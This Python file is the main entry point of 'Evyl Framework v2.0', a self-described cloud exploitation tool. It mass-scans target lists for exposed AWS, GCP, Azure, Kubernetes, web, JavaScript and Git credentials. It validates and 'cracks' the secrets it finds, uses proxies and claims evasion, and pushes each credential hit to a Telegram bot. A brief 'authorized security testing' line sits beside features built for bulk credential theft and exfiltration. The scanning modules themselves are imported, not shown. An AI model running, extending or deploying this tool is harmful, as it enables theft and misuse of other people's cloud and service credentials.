#!/usr/bin/env python3
"""
Evyl Framework v2.0 - Advanced Cloud Exploitation Framework
Author: Evyl Team
License: MIT

A modular exploitation framework for authorized security testing that:
- Scans and exploits cloud infrastructure (AWS, GCP, Azure, Kubernetes)
- Extracts credentials from 1500+ vulnerable endpoints
- Validates all discovered secrets automatically
- Provides real-time progress monitoring
- Operates with advanced evasion techniques
"""

import argparse
import asyncio
import sys
import os
import time
from typing import List, Optional
from pathlib import Path

# Add the project root to Python path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.live import Live
from rich.layout import Layout
from rich.table import Table

from core.scanner import Scanner
from core.exploiter import Exploiter
from core.validator import Validator
from core.reporter import Reporter
from utils.logger import Logger
from utils.progress import ProgressDisplay
from utils.network import NetworkManager
from utils.telegram import TelegramNotifier, TelegramProgressNotifier

console = Console()

class ProgressWrapper:
    """Wrapper to handle progress display with Live updates"""
    
    def __init__(self, progress_display, telegram_progress):
        self.progress_display = progress_display
        self.telegram_progress = telegram_progress
        self.last_hit_count = 0
        
    def get_layout(self):
        """Get the layout for Live display"""
        return self.progress_display.create_layout()
    
    def update_stats(self, stats):
        """Update statistics and handle Telegram notifications"""
        # Update base progress
        self.progress_display.update_stats(stats)
        
        # Check for new hits and send notifications
        current_hits = len(stats.credentials)
        if current_hits > self.last_hit_count:
            # New hits found, send notifications for each new hit
            for i in range(self.last_hit_count, current_hits):
                if i < len(stats.credentials):
                    asyncio.create_task(self.telegram_progress.notifier.notify_hit_found(stats.credentials[i]))
            self.last_hit_count = current_hits
        
        # Send progress update if needed
        asyncio.create_task(self.telegram_progress.maybe_notify_progress(
            stats.total_processed, 
            stats.unique_urls, 
            current_hits
        ))
    
    def update_filename(self, filename):
        """Update filename"""
        self.progress_display.update_filename(filename)

class EvylFramework:
    """Main Evyl Framework orchestrator"""
    
    def __init__(self, args):
        self.args = args
        self.logger = Logger(verbose=getattr(args, 'verbose', False))
        self.network_manager = NetworkManager()
        
        # Initialize Telegram notifications
        bot_token = getattr(args, 'bot_token', None)
        chat_id = getattr(args, 'chat_id', None)
        self.telegram = TelegramNotifier(bot_token, chat_id)
        self.telegram_progress = TelegramProgressNotifier(self.telegram)
        
        # Handle unlimited values
        threads = self._parse_unlimited_value(getattr(args, 'threads', 'unlimited'), default_unlimited=1000)
        timeout = self._parse_unlimited_value(getattr(args, 'timeout', 'unlimited'), default_unlimited=None)
        
        self.scanner = Scanner(
            threads=threads,
            timeout=timeout,
            network_manager=self.network_manager,
            telegram_notifier=self.telegram
        )
        self.exploiter = Exploiter(self.scanner)
        self.validator = Validator() if getattr(args, 'validate', True) else None
        self.reporter = Reporter(getattr(args, 'output_dir', 'results'))
        self.progress = ProgressDisplay()
        self.scan_start_time = None
        
    def _parse_unlimited_value(self, value, default_unlimited=None):
        """Parse unlimited values from arguments"""
        if isinstance(value, str) and value.lower() in ['unlimited', 'inf', 'infinite']:
            return default_unlimited
        elif isinstance(value, str) and value.isdigit():
            return int(value)
        elif isinstance(value, int):
            return value
        else:
            return default_unlimited
        
    def banner(self):
        """Display the framework banner"""
        banner_text = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                       🔥 EVYL FRAMEWORK v2.0 🔥                             ║
║                   Advanced Cloud Exploitation Framework                      ║
║                                                                              ║
║  🎯 Target Discovery    🔍 Credential Extraction    ✅ Automatic Validation ║
║  ☁️  Cloud Platforms    🐳 Kubernetes Clusters     🌐 Web Applications      ║
║  🛡️  Evasion Techniques 📊 Real-time Progress      📈 Performance Analytics ║
╚══════════════════════════════════════════════════════════════════════════════╝
        """
        console.print(Panel(banner_text, style="bold green"))
    
    async def run_scan(self):
        """Execute the main scanning process"""
        try:
            # Load targets
            targets = self.load_targets()
            if not targets:
                self.logger.error("No targets provided")
                return
            
            self.logger.info(f"Loaded {len(targets)} targets")
            self.scan_start_time = time.time()
            
            # Send Telegram notification about scan start
            target_filename = "N/A"
            if getattr(self.args, 'target_file', None):
                import os
                target_filename = os.path.basename(self.args.target_file)
                self.progress.update_filename(target_filename)
            
            await self.telegram.notify_scan_start(
                target_filename, 
                len(targets), 
                self.scanner.threads
            )
            
            # Check if progress display should be disabled
            if getattr(self.args, 'no_progress', False):
                # Run without live progress display
                scan_results = await self.scanner.scan_targets(targets, self.progress)
                self.logger.info("Scanning completed (no-progress mode)")
            else:
                # Pre-initialize scanner to get URL count before starting Live display
                self.logger.info("Initializing scanner...")
                urls_to_scan = self.scanner._generate_urls(targets)
                self.scanner.stats.unique_urls = len(urls_to_scan)
                self.progress.update_stats(self.scanner.stats)
                self.logger.info(f"Generated {len(urls_to_scan)} URLs to scan")
                
                # Initialize progress display with proper updating
                progress_wrapper = ProgressWrapper(self.progress, self.telegram_progress)
                with Live(progress_wrapper.get_layout(), refresh_per_second=4, console=console) as live:
                    # Start scanning (skip URL generation since we already did it)
                    scan_results = await self.scanner.scan_targets_with_urls(urls_to_scan, progress_wrapper)
                
                # Validate credentials if requested
                if self.validator and scan_results.credentials:
                    self.logger.info("Starting credential validation...")
                    validation_results = await self.validator.validate_all(
                        scan_results.credentials, self.progress
                    )
                    scan_results.validation_results = validation_results
                
                # Generate reports
                self.logger.info("Generating reports...")
                await self.reporter.generate_reports(scan_results)
                
                # Send completion notification
                scan_duration = time.time() - self.scan_start_time if self.scan_start_time else 0
                completion_stats = {
                    'total_processed': scan_results.total_processed,
                    'unique_urls': scan_results.unique_urls,
                    'credentials_found': len(scan_results.credentials),
                    'success_rate': scan_results.success_rate,
                    'duration': scan_duration
                }
                await self.telegram.notify_scan_complete(completion_stats)
                
                # Final summary
                self.display_summary(scan_results)
                
        except KeyboardInterrupt:
            self.logger.warning("Scan interrupted by user")
            await self.telegram.notify_error("Scan interrupted by user")
        except Exception as e:
            self.logger.error(f"Scan failed: {e}")
            await self.telegram.notify_error(f"Scan failed: {str(e)}")
    
    def load_targets(self) -> List[str]:
        """Load targets from file or command line"""
        targets = []
        
        if getattr(self.args, 'target_file', None):
            try:
                with open(self.args.target_file, 'r') as f:
                    targets = [line.strip() for line in f if line.strip()]
            except FileNotFoundError:
                self.logger.error(f"Target file not found: {self.args.target_file}")
        
        if getattr(self.args, 'targets', None):
            targets.extend(self.args.targets)
        
        return list(set(targets))  # Remove duplicates
    
    def display_summary(self, results):
        """Display final scan summary"""
        table = Table(title="🎯 Scan Summary")
        table.add_column("Metric", style="cyan")
        table.add_column("Value", style="green")
        
        table.add_row("Total URLs Processed", str(results.total_processed))
        table.add_row("Unique URLs", str(results.unique_urls))
        table.add_row("Credentials Found", str(len(results.credentials)))
        table.add_row("Valid Credentials", str(results.valid_credentials))
        table.add_row("Success Rate", f"{results.success_rate:.2f}%")
        
        console.print(table)

def auto_detect_optimal_threads():
    """Auto-detect optimal number of threads based on system resources"""
    import psutil
    try:
        # Get CPU count
        cpu_count = psutil.cpu_count()
        # Get available memory in GB
        memory_gb = psutil.virtual_memory().available / (1024**3)
        
        # Basic algorithm: use CPU count * 4, but limit based on memory
        optimal_threads = cpu_count * 4
        
        # Limit based on available memory (1 thread per 100MB)
        memory_limit = int(memory_gb * 10)
        optimal_threads = min(optimal_threads, memory_limit)
        
        # Ensure minimum and maximum bounds
        optimal_threads = max(10, min(optimal_threads, 500))
        
        return optimal_threads
    except Exception:
        return 50  # Safe default

def handle_run_command(args):
    """Handle the run command with auto-configuration"""
    # Auto-detect threads if needed
    if args.threads == 'auto':
        args.threads = auto_detect_optimal_threads()
        print(f"Auto-detected optimal threads: {args.threads}")
    elif args.threads.isdigit():
        args.threads = int(args.threads)
    else:
        args.threads = 50  # Default fallback
    
    # Set defaults for run command
    if not hasattr(args, 'timeout') or args.timeout is None:
        args.timeout = 'unlimited'
    if not hasattr(args, 'retries') or args.retries is None:
        args.retries = 3
    if not hasattr(args, 'delay') or args.delay is None:
        args.delay = 0
    if not hasattr(args, 'output_dir') or args.output_dir is None:
        args.output_dir = 'results'
    if not hasattr(args, 'validate') or args.validate is None:
        args.validate = not args.skip_validation if hasattr(args, 'skip_validation') else True
    
    # Set all module flags to True by default for run command
    args.kubernetes = True
    args.aws = True
    args.gcp = True
    args.azure = True
    args.web = True
    args.all_modules = True
    args.path_scanner = True
    args.js_scanner = True
    args.git_scanner = True
    
    # Validation flags
    args.validation_timeout = 30
    args.crack_aws = True
    args.crack_api = True
    args.crack_smtp = True
    
    # Output settings
    args.format = 'json'
    args.encrypt = False
    
    # Network settings
    if hasattr(args, 'proxies') and args.proxies:
        args.proxy_file = args.proxies
    else:
        args.proxy_file = None
    args.proxy = None
    args.user_agent = None
    args.headers = None
    
    # Misc settings
    args.resume = None
    args.config = None
    args.targets = None  # Use target_file instead
    
    return args

def handle_reset_command(args):
    """Handle the reset command"""
    console.print("[yellow]🔄 Resetting Evyl scanner state...[/yellow]")
    
    import shutil
    import os
    
    reset_count = 0
    
    # Reset scanner state (clear any existing session files)
    if args.scanner or not any([args.cache, args.logs]):
        scanner_dirs = ['.evyl_session', '.evyl_state', 'temp_scan']
        for dir_name in scanner_dirs:
            if os.path.exists(dir_name):
                shutil.rmtree(dir_name)
                console.print(f"[green]✓[/green] Cleared scanner state: {dir_name}")
                reset_count += 1
    
    # Clear cache
    if args.cache or not any([args.scanner, args.logs]):
        cache_dirs = ['.cache', '__pycache__', '.evyl_cache']
        for dir_name in cache_dirs:
            if os.path.exists(dir_name):
                shutil.rmtree(dir_name)
                console.print(f"[green]✓[/green] Cleared cache: {dir_name}")
                reset_count += 1
    
    # Clear logs  
    if args.logs or not any([args.scanner, args.cache]):
        log_files = ['evyl.log', 'error.log', 'debug.log']
        log_dirs = ['logs', '.evyl/logs']
        
        for log_file in log_files:
            if os.path.exists(log_file):
                os.remove(log_file)
                console.print(f"[green]✓[/green] Cleared log file: {log_file}")
                reset_count += 1
        
        for log_dir in log_dirs:
            if os.path.exists(log_dir):
                shutil.rmtree(log_dir)
                console.print(f"[green]✓[/green] Cleared log directory: {log_dir}")
                reset_count += 1
    
    if reset_count == 0:
        console.print("[blue]ℹ️[/blue] No scanner state found to reset")
    else:
        console.print(f"[green]🎉 Reset complete! Cleared {reset_count} items.[/green]")
    
    console.print("[cyan]💡 You can now run 'evyl run targets.txt' to start fresh[/cyan]")

def handle_diagnose_command(args):
    """Handle the diagnose command"""
    console.print("[yellow]🔍 Running Evyl diagnostics...[/yellow]")
    
    import psutil
    import sys
    import os
    
    # System diagnostics
    console.print("\n[bold]System Information:[/bold]")
    try:
        cpu_count = psutil.cpu_count()
        memory = psutil.virtual_memory()
        disk = psutil.disk_usage('.')
        
        console.print(f"  CPU Cores: {cpu_count}")
        console.print(f"  Total RAM: {memory.total / (1024**3):.2f} GB")
        console.print(f"  Available RAM: {memory.available / (1024**3):.2f} GB")
        console.print(f"  Free Disk Space: {disk.free / (1024**3):.2f} GB")
        console.print(f"  Python Version: {sys.version}")
        
        # Check if resources are sufficient
        if memory.available / (1024**3) < 2:
            console.print("[red]⚠️ WARNING: Less than 2GB RAM available[/red]")
        else:
            console.print("[green]✓ RAM: Sufficient[/green]")
            
        if disk.free / (1024**3) < 1:
            console.print("[red]⚠️ WARNING: Less than 1GB disk space available[/red]")
        else:
            console.print("[green]✓ Disk: Sufficient[/green]")
            
    except Exception as e:
        console.print(f"[red]Error getting system info: {e}[/red]")
    
    # File permissions
    console.print("\n[bold]File Permissions:[/bold]")
    test_files = ['evyl.py', 'core/scanner.py', 'utils/progress.py']
    for file_path in test_files:
        if os.path.exists(file_path):
            if os.access(file_path, os.R_OK):
                console.print(f"[green]✓ {file_path}: Readable[/green]")
            else:
                console.print(f"[red]✗ {file_path}: Not readable[/red]")
        else:
            console.print(f"[yellow]? {file_path}: Not found[/yellow]")
    
    # Dependencies check
    console.print("\n[bold]Dependencies:[/bold]")
    required_modules = ['aiohttp', 'rich', 'psutil', 'requests']
    for module in required_modules:
        try:
            __import__(module)
            console.print(f"[green]✓ {module}: Available[/green]")
        except ImportError:
            console.print(f"[red]✗ {module}: Missing[/red]")
    
    # Auto-detected settings
    console.print("\n[bold]Recommended Settings:[/bold]")
    optimal_threads = auto_detect_optimal_threads()
    console.print(f"  Optimal threads: {optimal_threads}")
    console.print(f"  Suggested command: evyl run targets.txt --threads={optimal_threads}")
    
    if args.full:
        console.print("\n[bold]Full Diagnostic Complete[/bold]")
        console.print("[cyan]💡 If scanner still has issues, try: evyl reset && evyl run targets.txt --force-start[/cyan]")
    else:
        console.print("\n[cyan]💡 Run 'evyl diagnose --full' for detailed diagnostics[/cyan]")

def parse_arguments():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description="Evyl Framework v2.0 - Advanced Cloud Exploitation Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Traditional usage
  %(prog)s -f targets.txt -o results/
  %(prog)s -t https://example.com -t https://test.com
  
  # New one-command launch
  %(prog)s run targets.txt
  %(prog)s run targets.txt --threads=50 --telegram
  %(prog)s run targets.txt --force-start --skip-validation
  
  # Emergency modes
  %(prog)s reset
  %(prog)s diagnose
        """
    )
    
    # Add subcommands
    subparsers = parser.add_subparsers(dest='command', help='Available commands')
    
    # Run command (new one-command launch)
    run_parser = subparsers.add_parser('run', help='Quick launch scanner with auto-configuration')
    run_parser.add_argument('target_file', help='Target file to scan')
    run_parser.add_argument('--threads', default='auto', help='Number of threads (default: auto-detect)')
    run_parser.add_argument('--proxies', help='Proxy file')
    run_parser.add_argument('--telegram', action='store_true', help='Enable Telegram notifications')
    run_parser.add_argument('--bot-token', help='Telegram bot token')
    run_parser.add_argument('--chat-id', help='Telegram chat ID')
    run_parser.add_argument('--force-start', action='store_true', help='Bypass initialization checks')
    run_parser.add_argument('--skip-validation', action='store_true', help='Skip target validation')
    run_parser.add_argument('--no-progress', action='store_true', help='Disable progress display')
    run_parser.add_argument('--debug-threads', action='store_true', help='Debug thread deadlocks')
    run_parser.add_argument('--auto', action='store_true', help='Enable all automatic features')
    run_parser.add_argument('--verbose', action='store_true', help='Enable verbose output')
    
    # Reset command
    reset_parser = subparsers.add_parser('reset', help='Reset scanner state')
    reset_parser.add_argument('--scanner', action='store_true', help='Reset scanner state')
    reset_parser.add_argument('--cache', action='store_true', help='Clear cache')
    reset_parser.add_argument('--logs', action='store_true', help='Clear logs')
    
    # Diagnose command  
    diagnose_parser = subparsers.add_parser('diagnose', help='Run diagnostic checks')
    diagnose_parser.add_argument('--full', action='store_true', help='Run full diagnostics')
    
    # Traditional mode arguments (when no subcommand is used)
    # Target options
    target_group = parser.add_argument_group('Target Options')
    target_group.add_argument('-f', '--file', dest='target_file', 
                             help='File containing target URLs/domains')
    target_group.add_argument('-t', '--target', dest='targets', action='append',
                             help='Single target URL/domain (can be used multiple times)')
    
    # Scanning options
    scan_group = parser.add_argument_group('Scanning Options')
    scan_group.add_argument('--threads', default='unlimited',
                           help='Number of threads (default: unlimited, use integer for specific limit)')
    scan_group.add_argument('--timeout', default='unlimited',
                           help='Request timeout in seconds (default: unlimited, use integer for specific limit)')
    scan_group.add_argument('--retries', type=int, default=3,
                           help='Number of retries per request (default: 3)')
    scan_group.add_argument('--delay', type=float, default=0,
                           help='Delay between requests in seconds (default: 0)')
    
    # Module options
    module_group = parser.add_argument_group('Module Options')
    module_group.add_argument('--kubernetes', action='store_true', default=True,
                             help='Enable Kubernetes scanning (default: enabled)')
    module_group.add_argument('--aws', action='store_true', default=True,
                             help='Enable AWS scanning (default: enabled)')
    module_group.add_argument('--gcp', action='store_true', default=True,
                             help='Enable GCP scanning (default: enabled)')
    module_group.add_argument('--azure', action='store_true', default=True,
                             help='Enable Azure scanning (default: enabled)')
    module_group.add_argument('--web', action='store_true', default=True,
                             help='Enable web application scanning (default: enabled)')
    module_group.add_argument('--all-modules', action='store_true', default=True,
                             help='Enable all scanning modules (default: enabled)')
    module_group.add_argument('--path-scanner', action='store_true', default=True,
                             help='Enable path scanning (default: enabled)')
    module_group.add_argument('--js-scanner', action='store_true', default=True,
                             help='Enable JavaScript analysis (default: enabled)')
    module_group.add_argument('--git-scanner', action='store_true', default=True,
                             help='Enable Git repository scanning (default: enabled)')
    
    # Validation options
    validation_group = parser.add_argument_group('Validation Options')
    validation_group.add_argument('--validate', action='store_true', default=True,
                                 help='Validate found credentials (default: enabled)')
    validation_group.add_argument('--validation-timeout', type=int, default=30,
                                 help='Validation timeout in seconds (default: 30)')
    validation_group.add_argument('--crack-aws', action='store_true', default=True,
                                 help='Enable AWS credential cracking (default: enabled)')
    validation_group.add_argument('--crack-api', action='store_true', default=True,
                                 help='Enable API credential cracking (default: enabled)')
    validation_group.add_argument('--crack-smtp', action='store_true', default=True,
                                 help='Enable SMTP credential cracking (default: enabled)')
    
    # Output options
    output_group = parser.add_argument_group('Output Options')
    output_group.add_argument('-o', '--output-dir', default='results',
                             help='Output directory (default: results)')
    output_group.add_argument('--format', choices=['json', 'html', 'txt', 'all'],
                             default='json', help='Output format (default: json)')
    output_group.add_argument('--encrypt', action='store_true',
                             help='Encrypt output files')
    
    # Network options
    network_group = parser.add_argument_group('Network Options')
    network_group.add_argument('--proxy', help='HTTP proxy (http://host:port)')
    network_group.add_argument('--proxy-file', help='File containing proxy list')
    network_group.add_argument('--user-agent', help='Custom User-Agent string')
    network_group.add_argument('--headers', help='Custom headers (JSON format)')
    
    # Miscellaneous
    misc_group = parser.add_argument_group('Miscellaneous')
    misc_group.add_argument('-v', '--verbose', action='store_true',
                           help='Enable verbose output')
    misc_group.add_argument('--resume', help='Resume from previous scan state')
    misc_group.add_argument('--config', help='Configuration file')
    misc_group.add_argument('--version', action='version', version='Evyl Framework v2.0')
    
    return parser.parse_args()

def main():
    """Main entry point"""
    args = parse_arguments()
    
    # Handle subcommands
    if hasattr(args, 'command') and args.command:
        if args.command == 'run':
            args = handle_run_command(args)
        elif args.command == 'reset':
            handle_reset_command(args)
            return
        elif args.command == 'diagnose':
            handle_diagnose_command(args)
            return
    
    # Validate arguments for traditional mode and run command
    if not args.target_file and not getattr(args, 'targets', None):
        if hasattr(args, 'command') and args.command == 'run':
            console.print("[red]Error: Target file required for run command.[/red]")
        else:
            console.print("[red]Error: No targets specified. Use -f or -t option.[/red]")
        sys.exit(1)
    
    # Create output directory
    output_dir = getattr(args, 'output_dir', 'results')
    Path(output_dir).mkdir(parents=True, exist_ok=True)
    
    # Initialize framework
    framework = EvylFramework(args)
    
    # Display banner (unless no-progress mode)
    if not getattr(args, 'no_progress', False):
        framework.banner()
    
    # Run the scan
    try:
        asyncio.run(framework.run_scan())
    except KeyboardInterrupt:
        console.print("\n[yellow]Scan interrupted by user[/yellow]")
        sys.exit(130)
    except Exception as e:
        console.print(f"[red]Fatal error: {e}[/red]")
        sys.exit(1)

if __name__ == "__main__":
    main()